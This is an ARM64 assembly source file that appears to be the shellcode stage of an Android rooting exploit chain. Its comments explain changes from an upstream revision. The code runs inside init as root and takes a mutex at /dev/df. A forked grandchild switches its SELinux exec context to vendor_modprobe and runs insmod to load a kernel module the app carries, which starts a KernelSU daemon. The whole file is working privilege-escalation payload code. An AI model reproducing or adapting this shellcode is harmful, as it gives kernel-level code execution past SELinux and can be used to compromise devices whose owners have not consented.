/*
 * DFRoot's chain, after e47ea6e: the shellcode `insmod`s the module instead of patching libc and exec'ing a
 * daemon, so the privileged half of this chain now lives in the kernel module the app carries.
 *
 * Two things differ from that revision, and both are in this file's data rather than its code:
 *
 *   - the third `insmod` argument is `package_name=<manager>`, a writable buffer the app fills, where
 *     upstream passes `soft_reboot=1`. Upstream's module turns that into an option of their KernelSU fork
 *     that the daemons built for this project do not accept; the reboot it asks for is this app's own
 *     setting, asked for after the run.
 *   - that buffer is why `libcxx_param_package_off` exists where `libcxx_soft_reboot_off` did.
 *
 * Everything else - the mutex at /dev/df, the forks, the SELinux context, the target library it patches -
 * is upstream's, unchanged. Read with exp.c's entry point, which is the other half of the same boundary.
 */
    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes - longest candidate path */

/*
 * The manager the module's user-space half is told to serve.
 *
 * A writable buffer rather than a literal, for the same reason `ko_target` is one: this chain drives one
 * library for three KernelSU projects, so the package is a value the app passes per run. It reaches the
 * module as an `insmod` parameter - `package_name=<manager>` - and the module hands it to
 * `ksud late-load --package-name`.
 *
 * The default is KernelSU's own package, so a run whose string cannot be read still passes a valid
 * parameter rather than an empty one, which would have the daemon serve nobody.
 */
param_package:
    .asciz "package_name=me.weishu.kernelsu"
    .skip 64 - (. - param_package), 0       /* exp.c's LIBCXX_PARAM_PACKAGE_BYTES */

    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data
    .global libcxx_param_package_off
libcxx_param_package_off:
    .int param_package - libcxx_data

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr              // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    sub     sp, sp, 32

    // Fork grandchild: set SELinux exec context → execve insmod
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    str     w0, [sp, 24]
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod", [exe_path, ko_target, "package_name=<manager>", NULL], NULL)
    //
    // Upstream passes `soft_reboot=1` in that third slot when its app asks for a restart, and its module
    // turns that into `ksud late-load ... --soft-reboot` - an option of *their* KernelSU fork, which the
    // daemons built for this project do not take. The reboot is this app's own setting instead, performed
    // after the run, so the slot carries the manager the module needs for the same command line.
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    adr     x1, param_package
    str     x1, [sp, 16]
    str     xzr, [sp, 24]
do_insmod:
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    b       myexit

myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
